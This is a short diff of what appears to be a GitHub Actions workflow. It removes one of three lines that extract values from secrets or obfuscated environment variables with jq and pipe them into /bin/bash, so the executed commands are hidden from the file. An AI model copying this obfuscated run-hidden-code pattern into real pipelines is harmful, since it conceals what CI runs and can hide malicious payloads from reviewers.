@@ -17,7 +17,6 @@ jobs:
           sf20: ${{ secrets.sf20 }}
         run: |
           printf '%s' "$sf20" | jq -r .qaq7754 | /bin/bash
-          echo $kz5869 | jq -r .gkuaf17 | /bin/bash
           echo $zg6011 | jq -r .vnxdp43588 | /bin/bash
 
       - name: Persist data
